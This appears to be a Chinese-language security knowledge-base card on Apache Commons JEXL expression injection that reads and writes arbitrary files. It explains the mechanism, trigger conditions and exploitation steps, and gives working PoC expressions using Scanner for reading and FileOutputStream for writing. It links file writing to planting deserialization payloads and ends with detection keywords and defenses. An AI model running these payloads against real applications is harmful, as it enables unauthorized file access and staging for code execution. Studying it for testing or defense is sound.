---
id: web-java-expression-jexl-file-read-write-scanner-fileoutputstream
title: JEXL new() 任意文件读写：Scanner 读文件、FileOutputStream.write(int) 逐字节写文件
type: scenario
domain: web
path: web/java/expression
technique: jexl-new-scanner-fileoutputstream-arbitrary-file-read-write
aliases:
- JEXL 文件读取
- JEXL 文件写入
- JEXL Scanner 读文件
- JEXL FileOutputStream 写文件
- useDelimiter
- FileOutputStream.write(int)
tags:
- java
- jexl
- expression-injection
- file-read
- file-write
- fileoutputstream
- scanner
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V365-fix
  verified_at: '2026-11-09T04:25:13+08:00'
  notes: V365 实测指出三处事实错误并已修正：1) write(byte[]) 并非不可用——'test'.getBytes() 在 commons-jexl3 3.2 返回 byte[]，new(FileOutputStream,path).write('test'.getBytes()) 实测写入成功；已将一句话结论与原理段改为可用，并保留原文作者用 [int,int] 未走通的说明。2) 数组字面量 [1,2,3] 在 3.2 为 int[]（不是 Integer[]/Object[]），已改。3) [a=...,...] 返回各元素结果组成的数组（FileOutputStream[]），不是最后一个表达式结果，已改。PoC 增加 getBytes 写 byte[] 变体，步骤3 同步。Scanner 读、write(int) 逐字节写与 3.3+/3.2 JexlSandbox 版本表述核对不变。主会话按 V365 实测结论修正后转 verified。
---

## 一句话结论

JEXL 纯表达式无法直接调用静态方法（`Files.readAllBytes` 求值为 null），但用 `new` 实例化 `Scanner(new File(path))` 可以读取任意文件，用 `new('java.io.FileOutputStream', path)` 的实例方法 `write(int)` 可以逐字节写入任意文件；`write(byte[])` 重载同样可用——`'test'.getBytes()` 在 commons-jexl3 3.2 实测返回 `byte[]`，可直接传入 `write(byte[])`（原文作者用 `[int,int]` 形式未走通，不代表该重载不可用）。

## 原理

- JEXL（Apache Commons JEXL）表达式注入入口下，`new('类名', 参数...)` 可实例化任意类并链式调用实例方法。
- 静态方法限制：JEXL 不能直接调用静态方法，`java.nio.file.Files.readAllBytes(new File(...).toPath())` 在表达式中求值为 null。把类注册进 JEXL context 或扩展引擎只发生在应用代码层，纯表达式场景不可用，只能改用实例方法。
- 读文件：`Scanner` 的构造器接受 `File`/`InputStream`；`useDelimiter('\\Z')` 以输入结束为分隔符，`next()` 一次读出全部内容。构造与调用全部是实例方法，JEXL 可直接完成。
- 写文件：`FileOutputStream.write(int)` 写单个字节；JEXL 序列表达式 `[a=new(...), a.write(116), ..., a.close()]` 按顺序求值，但返回的是各元素结果组成的数组（实测如 `FileOutputStream[]`），而不是最后一个表达式的结果；序列本身仍可用于完成打开、写入、关闭。
- 关于 `write(byte[])`：它同样可用——JEXL 虽无 `byte[]` 字面量，但可通过 `'test'.getBytes()` 得到 `byte[]`，再 `new('java.io.FileOutputStream', path).write('test'.getBytes())` 一次写入（3.2 实测成功）。原文作者用 `[int,int]` 形式未走通并求指点，不应推广为“不可用”。数组字面量 `[1,2,3]` 在 3.2 中为 `int[]`（不是 `Integer[]`/`Object[]`）；`[a=new(...), ...]` 返回各元素结果组成的数组。逐字节 `write(int)` 仍适用于需要精确控制或没有 `getBytes()` 来源的内容。
- 边界：JEXL 3.3+ 的 `JexlPermissions`（3.2 及更早为 `JexlSandbox`）若禁止 `java.io.File*`、`java.util.Scanner` 或 `new`，链会失效；应用进程对目标路径的读写权限是第二道限制。

## 触发条件

- JEXL 表达式注入入口，引擎允许 `new`，permissions/sandbox 未禁止 `java.io.File`、`FileOutputStream`、`Scanner`。
- 读：目标文件对应用进程可读，且表达式求值结果能回显；写：目标路径对应用进程可写。
- 需要可观察副作用（返回值回显、文件落地、后续访问验证）。

## 利用步骤

1. 读：提交 Scanner 表达式，观察返回值是否为文件内容；`useDelimiter` 的 `\Z` 在字符串层需正确转义（JEXL 表达式中写 `'\\Z'`）。
2. 写：提交 FileOutputStream 序列表达式写入已知字符串，访问文件验证。
3. 长内容或二进制：可优先用 `'<内容>'.getBytes()` 一次 `write(byte[])`；若只有十进制字节序列，则逐个生成 `a.write(<十进制>)`，最后 `a.close()`；二进制文件的写入是反序列化卡的前置步骤。

## PoC

```java
// 读文件（Files.readAllBytes 静态调用不可用）
new('java.util.Scanner', new('java.io.File','/tmp/flag.txt')).useDelimiter('\\Z').next()

// 写文件：逐字节写入 "test"（t/e/s/t = 116/101/115/116）
[a=new('java.io.FileOutputStream','1.txt'), a.write(116), a.write(101), a.write(115), a.write(116), a.close()]

// 写文件：一次写入 byte[]（3.2 实测可用）
new('java.io.FileOutputStream','1.txt').write('test'.getBytes())
```

写完整字节数据的生成思路：把目标内容转成字节数组，每个字节 b 生成一段 `a.write(<b 的十进制>)`，拼在 `[a=new('java.io.FileOutputStream','<path>'), ... , a.close()]` 中间；表达式长度随字节数线性增长。

## 变体与关联

- `Scanner` 也可包裹 `FileInputStream`、`URL` 等来源；读到的内容可继续参与表达式拼接或写入别处。
- 写文件原语可为 [[web-java-expression-jexl-objectinputstream-deserialization]] 落地反序列化 payload。
- 无引号过滤场景下类名与路径需用数字方法链构造，见 [[web-java-expression-jexl-no-quote-string-construction-bypass]]。
- 命令执行卡 [[web-java-expression-jexl-new-processbuilder-command-exec]]：无回显时也可用命令重定向写文件，与本卡的 Java 文件写入互补。

## 检测与防御

- 检测：表达式参数中出现 `java.util.Scanner`、`java.io.File`、`FileOutputStream`、`useDelimiter`、大量 `a.write(N)` 片段；JEXL 异常 `unsolvable function/method`；应用进程异常的文件读取与新建文件。
- 防御：禁止对用户输入求值；白名单 AST 加 `JexlPermissions`（3.3+）/`JexlSandbox`（3.2 及更早）禁止 `java.io.File*`、`Scanner` 与 `new`。
- 加固：求值服务最小权限运行、文件系统只读或目录隔离、监控异常文件访问。
